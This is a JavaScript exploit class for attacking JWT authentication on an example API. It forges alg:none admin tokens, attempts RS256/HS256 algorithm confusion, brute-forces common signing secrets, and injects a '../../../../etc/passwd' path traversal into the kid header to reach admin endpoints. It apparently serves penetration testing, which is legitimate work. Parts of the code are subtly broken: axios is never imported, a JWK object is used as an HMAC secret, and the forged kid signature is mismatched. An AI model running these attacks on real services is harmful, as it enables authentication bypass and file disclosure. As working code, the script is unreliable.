```javascript
// exploitation/jwt-exploit.js
const jwt = require('jsonwebtoken');

class JWTExploiter {
  constructor(validToken) {
    this.validToken = validToken;
    this.findings = [];
  }

  async exploit() {
    console.log('Attempting JWT exploitation...');

    await this.testNoneAlgorithm();
    await this.testAlgorithmConfusion();
    await this.testWeakSecret();
    await this.testKidInjection();

    return this.findings;
  }

  async testNoneAlgorithm() {
    // Create token with alg: none
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' }))
      .toString('base64').replace(/=/g, '');
    const payload = Buffer.from(JSON.stringify({ 
      sub: 'admin',
      role: 'admin',
      iat: Date.now() / 1000
    })).toString('base64').replace(/=/g, '');

    const noneToken = `${header}.${payload}.`;

    const response = await axios.get('https://api.example.com/api/admin', {
      headers: { 'Authorization': `Bearer ${noneToken}` },
      validateStatus: () => true
    });

    if (response.status === 200) {
      this.findings.push({
        type: 'JWT',
        severity: 'critical',
        issue: 'JWT none algorithm accepted',
        evidence: 'Successfully accessed admin endpoint with alg:none',
        token: noneToken
      });
    }
  }

  async testAlgorithmConfusion() {
    // Try to use RS256 public key as HS256 secret
    // First, try to get public key from JWKS endpoint
    try {
      const jwksResponse = await axios.get('https://api.example.com/.well-known/jwks.json');
      const publicKey = jwksResponse.data.keys[0];

      if (publicKey) {
        // Create HS256 token with public key as secret
        const confusedToken = jwt.sign(
          { sub: 'admin', role: 'admin' },
          publicKey, // Using public key as secret
          { algorithm: 'HS256' }
        );

        const response = await axios.get('https://api.example.com/api/admin', {
          headers: { 'Authorization': `Bearer ${confusedToken}` },
          validateStatus: () => true
        });

        if (response.status === 200) {
          this.findings.push({
            type: 'JWT',
            severity: 'critical',
            issue: 'Algorithm confusion vulnerability',
            evidence: 'RS256 key accepted as HS256 secret',
            token: confusedToken
          });
        }
      }
    } catch (error) {
      console.log('JWKS endpoint not available');
    }
  }

  async testWeakSecret() {
    const commonSecrets = [
      'secret', 'password', '123456', 'key', 
      'jwt', 'token', 'admin', 'supersecret'
    ];

    const parts = this.validToken.split('.');
    if (parts.length === 3) {
      const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());

      for (const secret of commonSecrets) {
        try {
          const testToken = jwt.sign(payload, secret, { algorithm: header.alg });

          const response = await axios.get('https://api.example.com/api/user', {
            headers: { 'Authorization': `Bearer ${testToken}` },
            validateStatus: () => true
          });

          if (response.status === 200) {
            this.findings.push({
              type: 'JWT',
              severity: 'critical',
              issue: 'Weak JWT secret discovered',
              evidence: `Secret '${secret}' works`,
              token: testToken
            });
            break;
          }
        } catch (e) {
          // Ignore
        }
      }
    }
  }

  async testKidInjection() {
    // Try path traversal in kid header
    const maliciousHeader = {
      alg: 'HS256',
      typ: 'JWT',
      kid: '../../../../etc/passwd'
    };

    const header = Buffer.from(JSON.stringify(maliciousHeader))
      .toString('base64').replace(/=/g, '');
    const payload = Buffer.from(JSON.stringify({ 
      sub: 'admin',
      role: 'admin'
    })).toString('base64').replace(/=/g, '');

    // Sign with any key
    const signature = jwt.sign(
      `${header}.${payload}`,
      'secret'
    ).split('.')[2];

    const maliciousToken = `${header}.${payload}.${signature}`;

    const response = await axios.get('https://api.example.com/api/admin', {
      headers: { 'Authorization': `Bearer ${maliciousToken}` },
      validateStatus: () => true
    });

    if (response.status === 200 || response.data.includes('root:')) {
      this.findings.push({
        type: 'JWT',
        severity: 'critical',
        issue: 'Kid header path traversal',
        evidence: response.data.substring(0, 200),
        token: maliciousToken
      });
    }
  }
}
